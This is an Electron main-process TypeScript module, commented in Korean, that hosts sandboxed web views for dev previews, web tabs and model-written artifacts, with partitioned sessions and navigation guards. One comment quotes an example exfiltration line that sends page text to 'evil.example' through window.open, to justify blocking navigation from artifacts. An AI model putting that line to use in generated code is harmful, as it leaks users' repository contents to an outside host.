import { BrowserWindow, WebContentsView, shell } from 'electron'
import type { WebContents } from 'electron'
import { BROWSER_PARTITION, IPC, PREVIEW_PARTITION, artifactPartition } from '@shared/types'
import { ARTIFACT_ORIGIN, parseArtifactUrl } from '@shared/artifactUrl'
import { applyContextMenu } from './guestContextMenu'
import {
  ensureArtifactSessionFor,
  forgetArtifactSession,
  forgetVisualizationsForWorkspace,
  isVisualizationUrlForWorkspace
} from './artifactProtocol'
import type { HostedViewKind, HostedViewLayout } from '@shared/types'
import { windowBackgroundColor } from './windows'
import { log } from './logger'

/**
 * 앱이 그리는 웹 콘텐츠(dev 프리뷰·웹 탭)의 소유자.
 *
 * 예전에는 렌더러가 `<webview>` 태그를 놓고 main 이 붙는 순간을 가로채 설정을 강제했다. 그
 * 구조에는 두 가지가 딸려 있었다 — 렌더러가 만든 webContents id 를 main 이 **믿지 않기 위한**
 * 관문이 필요했고, 패널을 분리한 창으로 떼면 태그가 새로 붙어 페이지가 처음부터 다시 로드됐다.
 *
 * 뷰를 main 이 만들면 둘 다 사라진다. 식별자는 우리가 발급한 `tabId` 라 "아무 webContents 나
 * 찍어 달라" 는 요청이 성립하지 않고, 창 사이를 옮기는 것은 부모를 바꾸는 일이라 페이지가 산다.
 *
 * 대신 새로 생기는 값이 하나 있다: **네이티브 뷰는 DOM 위에 그려진다.** 위치·크기는 렌더러가
 * 재서 알려 주고(`lib/hostedView.ts`), 모달 같은 것이 덮을 때는 렌더러가 숨김을 요청한다
 * (`lib/viewSuppress.ts`). 이 파일은 그 지시를 받아 적용하는 쪽이다.
 */

/**
 * 동시에 살려 둘 뷰의 수.
 *
 * 뷰 하나가 렌더러 프로세스 하나다(50~120MB). 탭을 닫지 않고 쌓아 두는 것은 브라우저에서
 * 지극히 평범한 사용이라, 상한이 없으면 그 평범한 사용이 곧 메모리 사고가 된다.
 *
 * **탭 레코드는 이 상한과 무관하다.** 탭(영속)과 뷰(캐시)의 수명을 나눈 것이 요점이다 —
 * 축출된 탭을 다시 누르면 주소로 되살아난다. 사용자가 잃는 것은 그 페이지의 스크롤 위치와
 * 폼 입력이지 탭 자체가 아니다.
 */
const MAX_LIVE_VIEWS = 6

/** 안 보이는 채로 이만큼 지나면 정리한다. 다시 누르면 주소로 되살아난다. */
const DORMANT_AFTER_MS = 10 * 60_000

/** 동면 검사 주기. */
const SWEEP_MS = 60_000

/** http/https 만. file:·about:·custom scheme 은 게스트가 갈 곳이 아니다. */
function isWebUrl(url: string): boolean {
  return /^https?:\/\//i.test(url)
}

interface Entry {
  view: WebContentsView
  workspaceId: string
  kind: HostedViewKind
  /** 지금 이 뷰를 붙이고 있는 창. 아무 창에도 안 붙어 있으면 null(정상 상태다 — 아래 참고). */
  ownerWindowId: number | null
  visible: boolean
  /** 마지막으로 화면에 보였던 시각. 동면·축출 판정의 기준이다. */
  lastVisibleAt: number
  /** 캡처·요소 픽커가 잡고 있는 동안 0 보다 크다. 이 사이에는 파괴하지 않는다. */
  busy: number
  /** 잡혀 있는 동안 파괴 요청이 왔다. 놓는 순간 처리한다. */
  destroyWhenFree?: boolean
}

/**
 * 게스트 webContents 에 거는 울타리.
 *
 * `webPreferences` 로 막는 것(preload 미주입·샌드박스·격리)과 달리 이쪽은 **실행 중 행동**을
 * 막는다. 뷰마다 걸어야 한다 — 예전에는 `app.on('web-contents-created')` 하나로 덮었지만,
 * 그건 게스트가 렌더러 손에서 태어났기 때문이었다. 이제 태어나는 자리가 여기 하나뿐이라
 * 생성 경로에서 거는 편이 빠짐이 없다.
 */
export function applyGuestGuards(contents: WebContents): void {
  // 새 창·팝업은 앱 안에 띄우지 않는다 — 주소창도 닫을 방법도 없는 창이 되기 때문이다.
  // 웹 주소면 사용자의 기본 브라우저로 넘긴다(거기엔 주소창이 있다).
  contents.setWindowOpenHandler(({ url }) => {
    if (isWebUrl(url)) void shell.openExternal(url)
    return { action: 'deny' }
  })

  // 게스트 안에서의 이동은 웹 주소인 한 자유롭게 둔다(dev 앱의 라우팅이 그렇다).
  // 그 밖의 스킴(file:·custom protocol)은 여기서 막는다.
  contents.on('will-navigate', (event, url) => {
    if (isWebUrl(url)) return
    event.preventDefault()
    log.info(`webViews: blocked navigation to ${url}`)
  })
}

/**
 * 이 종류의 게스트가 쓸 세션 파티션. dev 와 웹을 갈라 쿠키가 서로 새지 않게 한다.
 *
 * `switch` + `never` 로 쓴 이유가 있다. 삼항으로 두면 "웹이 아니면 dev" 가 되어, 나중에
 * 종류를 하나 더할 때 **아무 말 없이 dev 서버의 영속 세션을 쓰게 된다.** 아티팩트가 정확히
 * 그 경우다 — 모델이 쓴 코드가 우리 dev 서버의 쿠키·스토리지에 닿는 것은 이 파티션 분리가
 * 막으려던 바로 그것이다. 여기서 컴파일이 깨지면 세션을 어디에 둘지 반드시 고르게 된다.
 */
export function partitionFor(kind: HostedViewKind, workspaceId: string): string {
  switch (kind) {
    case 'dev':
      return PREVIEW_PARTITION
    case 'web':
      return BROWSER_PARTITION
    // 모델이 쓴 코드다. 워크스페이스마다 갈라 두고 **영속하지 않는다** — 앱이 사는 동안에도
    // 스토리지가 워크스페이스 경계를 넘으면 안 된다([[shared/types]] artifactPartition).
    case 'artifact':
    case 'visualization':
      return artifactPartition(workspaceId)
    default: {
      const unhandled: never = kind
      throw new Error(`webViews: no session partition chosen for kind "${String(unhandled)}"`)
    }
  }
}

/**
 * 아티팩트 게스트에게 거는 이동 가드 — dev·웹과 갈라지는 이유가 여기 다 있다.
 *
 * 위 `applyGuestGuards` 는 http(s) 이동을 **허용**하고 새 창 요청을 사용자의 기본 브라우저로
 * 넘긴다. 미리보는 것이 사용자 자신의 dev 서버나 사용자가 친 주소라면 맞는 판단이다.
 *
 * 모델이 쓴 코드에는 그게 유출 통로다:
 *
 * ```js
 * window.open('https://evil.example/?d=' + encodeURIComponent(document.body.innerText))
 * ```
 *
 * 이 한 줄이 사용자의 **진짜 브라우저**를 열어 방금 읽은 저장소 내용을 실어 보낸다. CSP 로는
 * 못 막는다 — `navigate-to` 지시문은 표준에서 빠졌고 Chromium 에 없다. 그래서 이동은 세션
 * 단위로 따로 막아야 한다.
 *
 * `will-navigate` 만으로는 부족하다 — 그건 **메인 프레임 전용**이다. 아티팩트가 iframe 을
 * 만들어 그 안에서 이동하면 통과한다. `will-frame-navigate` 가 서브프레임까지 덮는다.
 * (둘 다 `loadURL` 로는 안 뜨므로 우리가 버전을 갈아 끼우는 경로는 영향받지 않고, 해시
 * 이동에도 안 떠서 아티팩트 안의 `<a href="#toc">` 는 그대로 동작한다.)
 */
function applyArtifactGuards(contents: WebContents): void {
  contents.setWindowOpenHandler(({ url }) => {
    log.info(`artifact: blocked a new window to ${url}`)
    return { action: 'deny' }
  })

  const allowed = (url: string): boolean => url.startsWith(`${ARTIFACT_ORIGIN}/`)

  contents.on('will-navigate', (event, url) => {
    if (allowed(url)) return
    event.preventDefault()
    log.info(`artifact: blocked navigation to ${url}`)
  })

  contents.on('will-frame-navigate', (details) => {
    if (allowed(details.url)) return
    details.preventDefault()
    log.info(`artifact: blocked frame navigation to ${details.url}`)
  })
}

/** 뷰 하나를 만들 때 강제하는 설정. 예전 `will-attach-webview` 가 하던 일을 그대로 옮겼다. */
function guestWebPreferences(partition: string): Electron.WebPreferences {
  return {
    partition,
    // preload 는 앱의 IPC 표면 그 자체다 — 게스트에 딸려 들어가면 격리가 무의미해진다.
    // 태그 시절에는 렌더러가 적어 둔 값을 지웠지만, 이제는 애초에 넣지 않는다.
    contextIsolation: true,
    sandbox: true,
    nodeIntegration: false,
    nodeIntegrationInSubFrames: false,
    webviewTag: false
  }
}

/**
 * 뷰의 수명에 얹는 배선.
 *
 * 콘솔·네트워크 수집이 여기 붙는다. 예전에는 렌더러가 `dom-ready` 를 보고 "이 게스트를
 * 지켜봐 달라" 고 알려 줬는데, 그건 게스트가 렌더러 손에서 태어났기 때문에 어쩔 수 없던
 * 우회였다 — 첫 콘솔 줄을 놓치지 않으려면 실제 페이지가 로드되기 **전**에 붙어야 하는데,
 * 그 시점을 아는 것은 이제 이쪽이다.
 */
export interface HostedViewHooks {
  onCreated?(tabId: string, workspaceId: string, contents: WebContents): void
  onDestroyed?(tabId: string, workspaceId: string): void
}

export class HostedViewManager {
  private entries = new Map<string, Entry>()
  /** `closed` 를 이미 걸어 둔 창. 뷰마다 걸면 같은 창에 리스너가 쌓인다. */
  private watchedWindows = new Set<number>()
  private sweepTimer: ReturnType<typeof setInterval> | null = null

  constructor(
    private dispatch: (channel: string, payload: unknown) => void,
    private hooks: HostedViewHooks = {}
  ) {}

  /**
   * 탭에 뷰를 붙여 준다. 이미 있으면 그대로 쓴다.
   *
   * 탭을 만들었다고 뷰까지 만들지는 않는다 — 뷰 하나가 렌더러 프로세스 하나다. 한 번도 보지
   * 않은 탭에까지 프로세스를 내주면 탭을 쌓아 두는 평범한 사용이 곧 메모리 사고가 된다.
   */
  ensure(tabId: string, workspaceId: string, kind: HostedViewKind, initialUrl?: string): void {
    const existing = this.entries.get(tabId)
    if (existing) {
      if (existing.workspaceId !== workspaceId || existing.kind !== kind) {
        throw new Error('Hosted view identity mismatch.')
      }
      // 이미 있다 — 렌더러가 방금 다시 마운트한 것이다(탭을 오갔거나 창을 옮겼거나). 지금
      // 상태를 한 번 밀어 준다. 이게 없으면 새 화면은 주소도 앞뒤 버튼도 빈 채로 시작하고,
      // **첫 주소를 다시 로드해 보고 있던 페이지를 처음으로 되감는다** — 뷰를 살려 두는
      // 이유가 통째로 사라지는 자리다.
      this.pushState(tabId)
      return
    }

    const partition = partitionFor(kind, workspaceId)
    // 아티팩트 세션은 게으르게 선다. 뷰가 생기기 **전**인 지금이 유일하게 안전한 자리다 —
    // 여기서 안 세우면 첫 loadURL 이 핸들러 없는 스킴을 만난다([[main/artifactProtocol]]).
    if (kind === 'artifact' || kind === 'visualization') ensureArtifactSessionFor(partition)
    const view = new WebContentsView({ webPreferences: guestWebPreferences(partition) })
    // 첫 프레임 전과 리사이즈로 드러나는 가장자리에 흰 판이 번쩍이지 않게 앱 배경을 깔아 둔다.
    view.setBackgroundColor(windowBackgroundColor())
    // 모델이 쓴 코드는 아무 데도 못 간다. 사용자의 dev 서버·웹 탭과 규칙이 다르다.
    if (kind === 'artifact' || kind === 'visualization') applyArtifactGuards(view.webContents)
    else applyGuestGuards(view.webContents)
    // 우클릭 메뉴. Electron 은 기본 메뉴를 주지 않으므로 안 달면 우클릭이 아무 일도 안 한다.
    // 주인 창을 값이 아니라 클로저로 넘긴다 — 뷰는 창 사이를 옮겨 다닌다([[main/guestContextMenu]]).
    applyContextMenu(view.webContents, kind, () => this.ownerWindowOf(tabId))

    const entry: Entry = {
      view,
      workspaceId,
      kind,
      ownerWindowId: null,
      visible: false,
      lastVisibleAt: Date.now(),
      busy: 0
    }
    this.entries.set(tabId, entry)
    this.startSweep()
    this.watchNavigation(tabId, view.webContents)
    // 첫 loadURL 보다 먼저다 — 이 순서라야 페이지의 첫 콘솔 줄부터 잡힌다.
    this.hooks.onCreated?.(tabId, workspaceId, view.webContents)
    // 첫 주소는 **만든 자리에서만** 넣는다. 렌더러가 판단하면 마운트할 때마다 다시 로드하게
    // 되는데, 뷰가 이미 그 페이지에 있는지 아는 것은 이쪽뿐이다.
    if (initialUrl) this.load(tabId, initialUrl)
    this.evict()
  }

  /**
   * 내비게이션 신호를 상태 스냅샷 하나로 접어 렌더러에 민다.
   *
   * 예전에는 렌더러가 여섯 이벤트를 각각 구독해 네 개의 state 로 흩어 놨다. 렌더러는 게스트에
   * 동기 접근을 할 수 없으므로(`canGoBack()` 을 그 자리에서 못 부른다) 어차피 물어봐야 하는데,
   * 그럴 바에는 아는 쪽이 계산해서 한 번에 보내는 편이 맞다.
   */
  private watchNavigation(tabId: string, contents: WebContents): void {
    const push = (): void => this.pushState(tabId)
    contents.on('did-start-loading', push)
    contents.on('did-stop-loading', push)
    contents.on('did-navigate', push)
    contents.on('did-navigate-in-page', push)
    contents.on('dom-ready', push)

    contents.on('did-fail-load', (_e, errorCode, errorDescription, _url, isMainFrame) => {
      // -3 은 ERR_ABORTED — 사용자가 다음 주소로 넘어가면 이전 로드가 이렇게 끝난다. 실패가 아니다.
      if (errorCode === -3) return
      this.dispatch(IPC.evtHostedView, {
        type: 'fail',
        tabId,
        errorCode,
        errorDescription,
        isMainFrame
      })
    })
  }

  private pushState(tabId: string): void {
    const entry = this.entries.get(tabId)
    if (!entry || entry.view.webContents.isDestroyed()) return
    const wc = entry.view.webContents
    this.dispatch(IPC.evtHostedView, {
      type: 'state',
      tabId,
      url: wc.getURL(),
      loading: wc.isLoading(),
      canGoBack: wc.navigationHistory.canGoBack(),
      canGoForward: wc.navigationHistory.canGoForward(),
      ready: true
    })
  }

  /**
   * 뷰를 창에 붙인다. 렌더러의 자리표시자가 마운트될 때 불린다.
   *
   * 같은 창에 두 번 붙여도 안전해야 한다 — React 는 개발 모드에서 effect 를 두 번 돌리고,
   * 분리 창을 열고 닫는 동안 순서가 뒤집힐 수도 있다.
   */
  /** 이 뷰가 지금 붙어 있는 창. 어디에도 안 붙어 있으면 `null` — 그것도 정상 상태다. */
  private ownerWindowOf(tabId: string): BrowserWindow | null {
    const id = this.entries.get(tabId)?.ownerWindowId
    if (id == null) return null
    const win = BrowserWindow.fromId(id)
    return win && !win.isDestroyed() ? win : null
  }

  attach(tabId: string, windowId: number): void {
    const entry = this.entries.get(tabId)
    if (!entry) return
    if (entry.ownerWindowId === windowId) return

    this.detach(tabId)
    const win = BrowserWindow.fromId(windowId)
    if (!win || win.isDestroyed()) return
    win.contentView.addChildView(entry.view)
    entry.ownerWindowId = windowId
    this.watchWindow(win)
  }

  /**
   * 창이 닫히면 그 창이 붙이고 있던 뷰를 뗀다. **파괴가 아니다** — 분리한 작업 패널 창을
   * 닫았다고 보고 있던 페이지가 처음부터 다시 로드되면 안 된다.
   *
   * 창이 사라질 때 그 렌더러도 함께 사라지므로 언마운트 effect 가 돌지 않는다. 그래서
   * 렌더러의 detach 를 기다릴 수 없고, 이쪽에서 직접 들어야 한다. `PaneWindows` 에 이 배선을
   * 심지 않은 이유는 그쪽이 뷰를 알 이유가 없어서다.
   */
  private watchWindow(win: BrowserWindow): void {
    if (this.watchedWindows.has(win.id)) return
    const id = win.id
    this.watchedWindows.add(id)
    win.once('closed', () => {
      this.watchedWindows.delete(id)
      this.detachWindow(id)
    })
  }

  /**
   * 창에서 뗀다. 파괴하지 않는다.
   *
   * 어느 창에도 안 붙은 뷰는 **정상 상태**다 — 에이전트가 만든 dev 탭은 사용자가 그 탭을
   * 누르기 전까지 정확히 그 상태이고, 다른 워크스페이스를 보는 동안의 뷰도 그렇다.
   * 붙어 있기만 하고 안 보이는 뷰도 창 컴포지터에 남으므로, 숨길 때는 떼기까지 해야 실효가 있다.
   *
   * **뗀 뷰는 안 보이는 뷰다.** 이 한 줄이 예산(evict)과 동면(sweep)의 전제다 — 둘 다
   * `visible` 이 false 인 것만 후보로 본다. 렌더러는 자리표시자를 언마운트할 때 등록을 먼저
   * 지우고 detach 를 부르므로(`lib/hostedView.ts`), 마지막 `visible:false` 레이아웃은 영영
   * 오지 않는다. 여기서 직접 내리지 않으면 한 번이라도 화면에 떴던 뷰는 `visible:true` 로
   * 굳어 두 장치 모두에서 빠지고, 앱이 꺼질 때까지 렌더러 프로세스를 붙들고 있게 된다.
   */
  detach(tabId: string): void {
    const entry = this.entries.get(tabId)
    if (!entry) return
    // 주인 창이 이미 없더라도(중복 detach) 가시 상태는 내린다 — 굳는 것을 막는 게 요점이다.
    if (entry.visible) {
      entry.view.setVisible(false)
      entry.visible = false
    }
    if (entry.ownerWindowId === null) return
    const win = BrowserWindow.fromId(entry.ownerWindowId)
    entry.ownerWindowId = null
    if (!win || win.isDestroyed()) return
    win.contentView.removeChildView(entry.view)
  }

  /**
   * 렌더러가 잰 자리를 적용한다.
   *
   * 보낸 창이 그 뷰의 주인일 때만 받는다. 분리 창과 메인 창이 같은 워크스페이스를 그릴 수
   * 있어서, 주인이 아닌 쪽의 좌표를 받으면 뷰가 엉뚱한 창의 레이아웃을 따라간다.
   */
  applyLayout(senderWindowId: number, layouts: readonly HostedViewLayout[]): void {
    const win = BrowserWindow.fromId(senderWindowId)
    if (!win || win.isDestroyed()) return
    const content = win.getContentBounds()

    for (const layout of layouts) {
      const entry = this.entries.get(layout.tabId)
      if (!entry || entry.ownerWindowId !== senderWindowId) continue

      if (!layout.visible) {
        if (entry.visible) {
          entry.view.setVisible(false)
          entry.visible = false
        }
        continue
      }

      // 창 밖으로 나간 좌표는 잘라 낸다. 렌더러가 한 프레임 늦은 값을 보낼 수 있고, 그때
      // 뷰가 창 경계를 넘으면 다른 앱 위에 떠 있는 것처럼 보인다.
      const x = Math.max(0, Math.round(layout.x))
      const y = Math.max(0, Math.round(layout.y))
      entry.view.setBounds({
        x,
        y,
        width: Math.max(0, Math.min(Math.round(layout.width), content.width - x)),
        height: Math.max(0, Math.min(Math.round(layout.height), content.height - y))
      })
      if (!entry.visible) {
        entry.view.setVisible(true)
        entry.visible = true
      }
      entry.lastVisibleAt = Date.now()
    }
  }

  /**
   * 탭이 가리키는 게스트. 캡처·요소 픽커·이슈 수집이 이 관문 하나를 쓴다.
   *
   * `webContents.fromId()` 로 렌더러가 준 숫자를 되찾던 예전 관문을 대체한다 — 여기 있는
   * 것만 우리 뷰이므로, 검증이 곧 조회다.
   */
  resolve(tabId: string): { guest: WebContents } | { error: string } {
    const entry = this.entries.get(tabId)
    if (!entry || entry.view.webContents.isDestroyed())
      return { error: 'The preview is not ready yet.' }
    return { guest: entry.view.webContents }
  }

  /**
   * 이 워크스페이스의 그 종류 뷰. 없으면 null.
   *
   * 에이전트 도구가 쓰는 입구다 — 도구는 tabId 를 모르고 워크스페이스만 안다. 지금은
   * 워크스페이스당 dev 뷰가 하나뿐이라 첫 번째를 돌려주면 되고, 탭이 여럿이 되는 단계에서
   * "활성 탭" 규칙이 여기로 들어온다.
   */
  viewForWorkspace(workspaceId: string, kind: HostedViewKind): WebContents | null {
    const tabId = this.tabIdForWorkspace(workspaceId, kind)
    return tabId ? this.entries.get(tabId)!.view.webContents : null
  }

  /**
   * 그 뷰를 담은 탭의 id. 수집기가 탭 단위로 키를 잡으므로([[main/previewIssues]]) 워크스페이스만
   * 아는 호출자(에이전트 도구)가 이슈를 읽으려면 이 변환이 필요하다.
   */
  tabIdForWorkspace(workspaceId: string, kind: HostedViewKind): string | null {
    for (const [tabId, entry] of this.entries) {
      if (entry.workspaceId !== workspaceId || entry.kind !== kind) continue
      if (entry.view.webContents.isDestroyed()) continue
      return tabId
    }
    return null
  }

  /** 화면에 그려지고 있는가. 캡처는 그려지는 뷰에서만 유효하다. */
  isVisible(tabId: string): boolean {
    const entry = this.entries.get(tabId)
    return !!entry && entry.visible && entry.ownerWindowId !== null
  }

  /** 캡처·픽커가 잡는 동안 파괴를 막는다. 반환값을 부르면 놓는다. */
  hold(tabId: string): () => void {
    const entry = this.entries.get(tabId)
    if (!entry) return () => {}
    entry.busy += 1
    return () => {
      entry.busy = Math.max(0, entry.busy - 1)
      // 잡혀 있는 동안 온 파괴 요청을 여기서 갚는다. 탭이 닫힌 뒤에는 다시 요청해 줄 사람이
      // 없으므로, 이걸 안 하면 찍는 중에 닫은 탭의 뷰만 동면 스윕까지 살아남는다.
      if (entry.busy === 0 && entry.destroyWhenFree) this.destroy(tabId)
    }
  }

  load(tabId: string, url: string): void {
    const entry = this.entries.get(tabId)
    if (!entry) return
    if (entry.kind === 'visualization' && !isVisualizationUrlForWorkspace(entry.workspaceId, url)) {
      throw new Error('Invalid visualization URL.')
    }
    if (entry.kind === 'artifact') {
      const route = parseArtifactUrl(url)
      if (route?.kind !== 'artifact' || route.workspaceId !== entry.workspaceId) {
        throw new Error('Invalid artifact URL.')
      }
    }
    const target = this.resolve(tabId)
    if ('error' in target) return
    void target.guest.loadURL(url).catch((err) => log.info(`webViews: load failed — ${err}`))
  }

  reload(tabId: string): void {
    const target = this.resolve(tabId)
    if (!('error' in target)) target.guest.reload()
  }

  stop(tabId: string): void {
    const target = this.resolve(tabId)
    if (!('error' in target)) target.guest.stop()
  }

  goBack(tabId: string): void {
    const target = this.resolve(tabId)
    if ('error' in target) return
    if (target.guest.navigationHistory.canGoBack()) target.guest.navigationHistory.goBack()
  }

  goForward(tabId: string): void {
    const target = this.resolve(tabId)
    if ('error' in target) return
    if (target.guest.navigationHistory.canGoForward()) target.guest.navigationHistory.goForward()
  }

  /**
   * 뷰를 없앤다. 탭 레코드는 이 함수가 건드리지 않는다.
   *
   * 탭(영속)과 뷰(캐시)의 수명을 나누는 것이 이 설계의 요점이다 — 예산이 넘치거나 오래 안 본
   * 뷰는 여기서 사라지고, 사용자가 그 탭을 다시 누르면 주소로 되살아난다.
   */
  destroy(tabId: string): void {
    const entry = this.entries.get(tabId)
    if (!entry) return
    if (entry.busy > 0) {
      entry.destroyWhenFree = true
      return
    }
    this.detach(tabId)
    this.entries.delete(tabId)
    this.hooks.onDestroyed?.(tabId, entry.workspaceId)
    if (!entry.view.webContents.isDestroyed()) entry.view.webContents.close()
    this.dispatch(IPC.evtHostedView, { type: 'gone', tabId })
  }

  /**
   * 예산을 넘으면 오래 안 본 뷰부터 정리한다.
   *
   * 보이는 뷰와 잡혀 있는 뷰(캡처·픽커 진행 중)는 후보가 아니다 — 사용자가 지금 보고 있는
   * 화면이 사라지거나, 찍는 도중에 대상이 없어지면 그건 버그로 보인다.
   */
  private evict(): void {
    if (this.entries.size <= MAX_LIVE_VIEWS) return
    const candidates = [...this.entries]
      .filter(([, e]) => !e.visible && e.busy === 0)
      .sort((a, b) => a[1].lastVisibleAt - b[1].lastVisibleAt)
    for (const [tabId] of candidates) {
      if (this.entries.size <= MAX_LIVE_VIEWS) break
      this.destroy(tabId)
    }
  }

  /**
   * 오래 안 본 뷰를 걷어낸다.
   *
   * 예산만으로는 부족하다 — 탭 두 개만 열어 둔 채 며칠 켜 두면 예산에 안 걸리면서 프로세스
   * 둘이 계속 산다. `unref` 로 걸어 이 타이머가 앱을 붙잡지 않게 한다.
   */
  private startSweep(): void {
    if (this.sweepTimer) return
    this.sweepTimer = setInterval(() => {
      const now = Date.now()
      for (const [tabId, entry] of [...this.entries]) {
        if (entry.visible || entry.busy > 0) continue
        if (now - entry.lastVisibleAt < DORMANT_AFTER_MS) continue
        this.destroy(tabId)
      }
      if (this.entries.size === 0 && this.sweepTimer) {
        clearInterval(this.sweepTimer)
        this.sweepTimer = null
      }
    }, SWEEP_MS)
    this.sweepTimer.unref?.()
  }

  /** 워크스페이스가 아카이브·삭제될 때 그 아래 뷰를 전부 정리한다. */
  destroyWorkspace(workspaceId: string): void {
    for (const [tabId, entry] of [...this.entries])
      if (entry.workspaceId === workspaceId) this.destroy(tabId)
    // 뷰를 다 거뒀으면 그 워크스페이스 전용 아티팩트 세션도 놓는다 — 파티션이 워크스페이스마다
    // 하나라, 여기서 안 놓으면 세션과 그 protocol 핸들러가 앱이 꺼질 때까지 남는다.
    forgetArtifactSession(partitionFor('artifact', workspaceId))
    forgetVisualizationsForWorkspace(workspaceId)
  }

  /** 창이 닫힐 때 그 창이 붙이고 있던 뷰를 뗀다 — 파괴가 아니다(페이지를 살려 둔다). */
  detachWindow(windowId: number): void {
    for (const [tabId, entry] of this.entries)
      if (entry.ownerWindowId === windowId) {
        entry.ownerWindowId = null
        entry.visible = false
      } else void tabId
  }
}
